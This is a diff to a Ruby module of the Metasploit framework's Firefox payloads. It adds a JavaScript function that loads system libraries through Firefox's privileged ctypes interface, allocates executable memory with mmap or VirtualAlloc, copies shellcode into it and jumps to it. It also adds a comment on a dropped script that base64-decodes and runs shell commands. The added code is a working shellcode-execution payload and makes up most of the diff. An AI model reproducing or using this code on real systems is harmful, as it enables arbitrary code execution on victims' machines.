@@ -4,7 +4,6 @@ require 'json'
 
 module Msf::Payload::Firefox
 
-
   # Javascript source code of setTimeout(fn, delay)
   # @return [String] javascript source code that exposes the setTimeout(fn, delay) method
   def set_timeout_source
@@ -13,6 +12,103 @@ module Msf::Payload::Firefox
         var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
         timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
         return timer;
+      };
+    |
+  end
+
+  # Puts the shellcode into memory, adds X flag, and calls it
+  # The js function throws on error
+  # @return [String] javascript code containing the execShellcode() fn
+  def exec_shellcode_source
+    %Q|
+      var execShellcode = function(shellcode) {
+        var POSIX = {
+          RWX: 7,
+          ANON_PRIVATE: 4098
+        };
+        var WIN = {
+          RWX: 0x40,
+          ANON_PRIVATE: 0x1000
+        };
+        var LIBS = [
+          "C:\\\\WINDOWS\\\\system32\\\\user32.dll",
+          "/usr/lib/libSystem.B.dylib",
+          "libc.so.6",
+          "libc.so"
+        ];
+
+        Components.utils.import("resource://gre/modules/ctypes.jsm");
+        var openLibs = function(libs) {
+          var i, lib;
+          for (i in libs) {
+            try {
+              lib = ctypes.open(libs[i]);
+              return lib;
+            } catch (e) {}
+          }
+        };
+
+        var lib = openLibs(LIBS);
+        if (!lib) throw new Error("Could not find lib in ["+LIBS+"]");
+
+        var execPosix = function() {
+          var mmap = lib.declare('mmap',
+            ctypes.default_abi,   /* calling convention */
+            ctypes.voidptr_t,     /* return type */
+            ctypes.voidptr_t,     /* address (NULL here) */
+            ctypes.size_t,        /* num bytes */
+            ctypes.int,           /* PROT_READ OR PROT_WRITE OR PROT_EXEC */
+            ctypes.int,           /* MAP_ANONYMOUS OR MAP_PRIVATE */
+            ctypes.int,           /* fd (0) */
+            ctypes.int            /* offset (0) */
+          );
+          var memcpy = lib.declare('memcpy',
+            ctypes.default_abi,   /* calling convention */
+            ctypes.voidptr_t,     /* return type */
+            ctypes.voidptr_t,     /* dest */
+            ctypes.voidptr_t,     /* src */
+            ctypes.size_t         /* size to copy */
+          );
+          var buff = mmap(null, shellcode.length, POSIX.RWX, POSIX.ANON_PRIVATE, 0, 0);
+          memcpy(buff, ctypes.jschar.array()(shellcode), shellcode.length);
+          // there is probably a better way to do this
+          var m = buff.toString().match(/"0x([0-9a-fA-F]*)"/);
+          if (!m) throw new Error("Could not find address of buffer.");
+          ctypes.FunctionType(ctypes.default_abi, ctypes.int).ptr(parseInt(m[1], 16))();
+        };
+
+        var execWindows = function() {
+          var VirtualAlloc = lib.declare('VirtualAlloc',
+            ctypes.winapi_abi,    /* calling convention */
+            ctypes.voidptr_t,     /* return type */
+            ctypes.voidptr_t,     /* start address (NULL here) */
+            ctypes.size_t,        /* num bytes */
+            ctypes.unsigned_long, /* alloc type */
+            ctypes.unsigned_long  /* protection flags */
+          );
+          var memcpy = lib.declare('memcpy',
+            ctypes.winapi_abi,    /* calling convention */
+            ctypes.voidptr_t,     /* return type */
+            ctypes.voidptr_t,     /* dest */
+            ctypes.voidptr_t,     /* src */
+            ctypes.size_t         /* size to copy */
+          );
+          var buff = VirtualAlloc(null, shellcode.length, WIN.ANON_PRIVATE, WIN.RWX);
+          memcpy(buff, ctypes.jschar.array()(shellcode), shellcode.length);
+          var m = buff.toString().match(/"0x([0-9a-fA-F]+)"/);
+          if (!m) throw new Error("Could not find address of buffer.");
+          ctypes.FunctionType(ctypes.default_abi, ctypes.int).ptr(parseInt(m[1], 16))();
+        };
+
+        var i, errs = [], fns = [execPosix, execWindows];
+        for (i in fns) {
+          try {
+            fns[i](shellcode);
+            return true;
+          } catch(e) { errs.push(e.message); }
+        }
+
+        throw new Error("All methods failed. Exceptions encountered:\\n["+errs+"]");
       };
     |
   end
@@ -172,6 +268,8 @@ module Msf::Payload::Firefox
 
   # This file is dropped on the windows platforms to a temp file in order to prevent the
   # cmd.exe prompt from appearing. It is executed and then deleted.
+  #
+  # Note: we should totally add a powershell replacement here.
   #
   # @return [String] JScript that reads its command-line argument, decodes
   # base64 and runs it as a shell command.
